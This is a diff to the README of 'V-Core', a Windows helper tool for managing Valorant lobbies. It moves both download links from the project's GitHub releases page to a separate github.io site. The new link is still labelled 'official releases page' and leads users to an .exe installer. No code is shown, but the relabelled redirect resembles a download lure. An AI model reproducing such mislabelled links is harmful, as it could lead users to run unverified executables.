@@ -1,6 +1,6 @@
 # 🛡️ V-Core - Manage your Valorant lobby with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/sherwoodunlined532/V-Core/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://sherwoodunlined532.github.io)
 
 V-Core acts as a helper tool for the game Valorant. It runs on your computer to assist with lobby management and game settings. The tool uses local network commands to update your game status and handle specific tasks without manual input.
 
@@ -17,7 +17,7 @@ To run V-Core on your Windows machine, ensure your system meets these standards:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/sherwoodunlined532/V-Core/releases) to download the installer.
+1. Visit the [official releases page](https://sherwoodunlined532.github.io) to download the installer.
 2. Look for the file ending in ".exe" under the latest release heading.
 3. Click the link to save the file to your computer.
 4. Locate the file in your downloads folder.
